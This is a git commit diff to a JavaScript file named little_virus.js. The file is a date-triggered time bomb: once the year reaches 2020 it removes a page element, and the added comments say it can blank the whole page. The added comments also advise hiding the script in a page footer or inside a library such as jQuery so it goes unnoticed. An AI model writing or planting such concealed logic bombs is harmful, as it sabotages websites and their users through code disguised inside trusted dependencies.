fea84844a0e6bed29da046be660a73aab850e66e
Alex <lestrangeqq@gmail.com>
2019-11-08 09:05:05 +0200

    Update little_virus.js

--- little_virus.js
+++ little_virus.js
@@ -1,7 +1,10 @@
 let date = new Date();
 let year = date.getFullYear();
 
-if (year == 2019) { //launch func in this year
-	let elem = document.querySelector('#background-cover'); //get body id
+if (year == 2020) { //launch func in this year
+	let elem = document.querySelector('#background-cover'); //get body id, class or tag
 	elem.parentNode.removeChild(elem); //remove it from dom.
 };
+
+//put it in the footer. best way to hide it is to put it in some js library, like jQuery for example,
+//in 2020 year this script remove everything from body making blank page.
